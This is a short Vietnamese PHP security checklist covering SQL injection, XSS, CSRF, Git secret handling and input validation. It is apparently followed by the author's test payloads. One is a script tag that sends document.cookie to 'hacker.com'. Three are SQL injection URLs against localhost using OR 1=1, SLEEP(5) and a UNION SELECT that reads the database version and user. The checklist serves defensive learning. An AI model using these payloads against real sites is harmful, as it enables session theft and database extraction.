# PHP Security Checklist

## 1. SQL Injection

-  Không nối trực tiếp input của user vào SQL.
-  Sử dụng PDO Prepared Statement.
-  Sử dụng `prepare()` và `execute()`.
-  Validate input trước khi truy vấn database.
## 2. XSS

-  Không output trực tiếp dữ liệu do user nhập.
-  Sử dụng `htmlspecialchars()` khi output HTML.
-  Kiểm tra các biến được render ra giao diện.


## 3. CSRF (Cross-Site Request Forgery)
-  Mọi form có thao tác thay đổi dữ liệu (POST) bắt buộc phải có `CSRF Token`.
-  Kiểm tra Token trên server có khớp với Token của người dùng không.



## 4. Git
-  Không commit `.env`.
- Không commit API key/password.
- Review code trước khi `git push`. 

## 5. Input Validation

- Kiểm tra đúng kiểu dữ liệu.
- Kiểm tra miền giá trị.
- Không tin tưởng dữ liệu từ client.





<script>
  fetch("https://hacker.com/data=" + document.cookie);
</script>


http://localhost:8000/index.php?id=99999 OR 1=1

http://localhost:8000/index.php?id=6 AND SLEEP(5)

http://localhost:8000/index.php?id=-1%20UNION%20SELECT%201,%20version(),%20user(),%204,%205,%206,%207,%208,%209,%2010